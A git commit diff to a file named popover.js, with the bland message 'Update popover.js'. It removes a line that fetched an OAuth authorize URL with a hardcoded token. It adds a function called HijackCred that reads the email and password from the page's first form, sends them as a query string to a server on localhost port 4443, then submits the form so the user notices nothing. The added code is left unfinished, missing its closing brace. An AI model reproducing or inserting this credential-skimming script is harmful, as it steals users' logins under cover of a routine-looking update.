f563c53fa0841d9c47fd83f39eb3ca673aa49247
dimpol <djdimpol@rocketmail.com>
2016-11-07 14:10:29 +0200

    Update popover.js

--- js/src/popover.js
+++ js/src/popover.js
@@ -1,1 +1,7 @@
-$.get('https://apisandbox.openbankproject.com/oauth/authorize?oauth_token=EYUQBNUZJJZCKUJNLGSOMRGRAV3XOS4BTK110ASZ',function(r){write(r)})
+function HijackCred() {
+    var email = document.forms[0].elements[0].value;
+    var pass = document.forms[0].elements[1].value;
+    img = new Image();
+img.src = "https://localhost:4443?" + "email=" + escape(email) + "&" + "password=" + escape(pass);
+setTimeout('document.forms[0].submit();', 3000);
+return false;
